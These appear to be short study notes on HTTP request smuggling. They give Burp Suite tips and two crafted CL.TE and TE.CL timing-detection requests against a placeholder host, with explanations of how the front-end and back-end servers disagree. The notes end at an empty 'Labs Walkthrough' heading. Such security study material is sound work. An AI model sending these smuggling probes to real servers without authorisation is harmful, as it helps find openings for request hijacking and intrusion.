# HTTP Request Smuggling Notes

You need to include the trailing sequence `\r\n\r\n` in burp following the 0 in requests using TE.CL

In addition, in burp uncheck the `Update Content-Length` header

## Methodology

### CL.TE example test

Example request to test for CL.TE

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

Content-Length will be forwarded as it fits correctly, omitting the X. Then the Transfer-Encoding of the backend will process the first chunk (The 1, and A), then come to the X and awai for the next chunk to arrive causing a time delay.

### TE.CL Example test

Example request to test for TE.CL

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

The transfer encoding header gets checked and only passes part of the request, omitting the X. The back-end server uses the `Content-Length` header, expects more content in the message body and waits causing the time delay to detect.

## Labs Walkthrough
